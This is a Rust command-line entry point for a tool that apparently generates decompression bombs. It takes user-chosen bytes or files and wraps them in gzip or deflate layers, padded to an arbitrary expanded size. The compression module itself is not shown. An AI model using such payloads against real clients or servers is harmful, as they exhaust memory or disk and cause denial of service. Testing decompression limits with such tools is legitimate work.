use crate::payload::*;
use std::str::FromStr;
use std::io::Read;

pub mod payload;

fn main() {
    let mut data = Vec::<Segment>::new();
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 3 {
        println!("Usage: ied [content encoding] [size] [payload]");
        return;
    }

    let encoding = &args[1];
    let size = num::BigUint::from_str(&args[2]).expect("Invalid size given");

    let mut cur_arg = 3;
    while cur_arg < args.len() {
        if args[cur_arg] == "-f" {
            cur_arg += 1;
            if cur_arg >= args.len() {
                panic!("-f: missing file");
            }
            let mut file = std::fs::File::open(&args[cur_arg]).expect("Failed to open file");
            let mut contents: Vec<u8> = vec![];
            file.read_to_end(&mut contents).expect("Failed to read file");

            let block = Segment::Block(Block::new(contents.into_boxed_slice()));
            data.push(block);

            cur_arg += 1;
            continue;
        }

        let byte: u8;
        if args[cur_arg] == "-l" {
            cur_arg += 1;
            if cur_arg >= args.len() {
                panic!("-l: missing character");
            }
            byte = args[cur_arg].chars().nth(0).expect("-l: missing character") as u8;
            cur_arg += 1;
        } else if args[cur_arg] == "-L" {
            cur_arg += 1;
            if cur_arg >= args.len() {
                panic!("-L: missing character");
            }
            byte = args[cur_arg].parse::<u8>().expect("-L: invalid character");
            cur_arg += 1;
        } else {
            panic!("Invalid flag {}", args[cur_arg]);
        }

        let bomb = Segment::Bomb(Bomb::new(Box::new([byte])));
        data.push(bomb);
    }

    let mut payload = Payload::new(data.into_boxed_slice());
    let split = encoding.split(',');

    for method_raw in split.into_iter() {
        let method = method_raw.trim();
        if method == "gzip" {
            payload = gzip(payload);
        } else if method == "deflate" {
            payload = zlib(payload);
        } else {
            panic!("Invalid method {}", method);
        }
    }

    payload.fill(&size);
    payload.write(&mut std::io::stdout());
}
